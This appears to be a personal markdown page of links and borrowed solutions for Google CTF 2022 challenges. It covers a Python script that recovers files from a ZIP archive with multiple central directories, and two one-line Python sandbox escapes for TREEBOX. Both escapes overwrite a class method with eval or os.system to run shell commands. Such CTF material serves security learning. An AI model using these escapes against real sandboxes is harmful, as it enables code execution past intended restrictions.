# Google CTF 2022 Writeups - Some that I want to remember and come back to

No particular pattern to the topics here other than "I found it interesting"

I didn't solve any of these myself (Welp 😋), credits for the solutions included where I could find them.

## APPNOTE.TXT 

[Link 1](https://able.bio/sudoaza/appnotetxt-google-ctf-2022--32ef39da) 

[Link 2](https://github.com/piyagehi/CTF-Writeups/blob/main/2022-Google-CTF/misc-appnote.md) ZIP file with dozens (hundreds) of smaller files in it?

@`ContronThePanda#5339`
```py
#!/usr/bin/env python3

# The `dump.zip` file contains multiple central directory structures,
# each of which points to only a single file in the archive.
# By default, zip utilities/parsers scan from the end of the file to find the *last*
# end of central directory signature, and use that central directory.
# By deleting that signature from the last central directory,
# we can make the regular Linux `unzip` utility read the second-to-last central directory instead.
# We can repeat this process to get all of the files in all of the central directories extracted.

from os import system

# Read the zipfile and reverse it, so we can substitute starting from the end
with open('dump.zip', 'rb') as f: zf = f.read()[::-1]

while True:
    # Overwrite the signature with zeroes
    # Since we do this before unzipping the first time,
    # we miss the first central directory,
    # but that one doesn't contain anything important
    zfnew = zf.replace(b'\x06\x05\x4b\x50', b'\0\0\0\0', 1)
    # If nothing was replaced, there are no central directories left
    if zfnew == zf: break
    zf = zfnew
    # Write the modified zip file out
    with open('dump-ed.zip', 'wb') as f: f.write(zf[::-1])
    # Unzip the file with the Linux `unzip` utility
    # The `-o` flag overwrites existing files without asking,
    # just in case we've previously extracted some
    # We redirect the output because the program complains very loudly about what we're doing,
    # even though it still works
    system('unzip -o dump-ed.zip >/dev/null 2>&1')

# The glob will put the files in alphabetical order,
# which is the correct order in this case
system('cat flag*')
# Newline
print()
```

## JS Safe 4.0 

[Link](https://lightstack.ml/posts/googlectf22_jssafe4/)

## TREEBOX 

[Link](https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/)

Shorter solutions I found on the disc
@`crazyman#6644`
```py
tree.__class__.__getitem__ = eval
tree["__import__('os').system('cat flag')"]
```
![Solution image](https://cdn.discordapp.com/attachments/984517082853036103/993224517658890270/unknown.png)

@`温柔小🐷#0995`
```py
os.environ.__class__.__contains__ = os.system
'cat flag' in os.environ
```


## Postviewer

[Intended solution](https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710)

[Challenge URL](https://postviewer-web.2022.ctfcompetition.com/)

#### TODO: Get challenge URLs or code for the rest before they are lost to time


#### That's all for now. 😄
I'll stalk the gCTF discord for more solutions (Maybe)